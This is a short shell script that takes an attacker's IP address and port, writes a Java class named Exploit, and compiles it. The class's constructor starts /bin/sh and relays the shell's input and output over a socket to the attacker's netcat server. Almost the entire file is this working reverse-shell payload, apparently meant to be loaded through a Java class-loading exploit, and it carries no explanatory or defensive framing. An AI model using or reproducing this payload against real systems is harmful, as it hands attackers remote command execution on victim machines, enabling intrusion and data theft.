#!/bin/sh

# Parse commandline arguments
if [ ${#} -ne 2 ]; then
    echo "ERROR: use as '${0} ATTACKER_IP ATTACKER_PORT'"
    echo "being...ATTACKER_IP the IP of the attacker's netcat server"
    echo "     ...ATTACKER_PORT the PORT of the attacker's netcat server"
    exit 1
fi
ATTACKER_IP=${1}
ATTACKER_PORT=${2}
EXPOIT_CLASS="Exploit"

# Generate the Java file
echo \
"import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {
    public Exploit() throws Exception {
        String host=\"${ATTACKER_IP}\";
        int port=${ATTACKER_PORT};
        String cmd=\"/bin/sh\";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(),
            pe=p.getErrorStream(),
            si=s.getInputStream();
        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0)
                so.write(pi.read());
            while(pe.available()>0)
                so.write(pe.read());
            while(si.available()>0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }
            catch (Exception e){
            }
        };
        p.destroy();
        s.close();
    }
}" > ${EXPOIT_CLASS}.java

# Compile it
javac ${EXPOIT_CLASS}.java
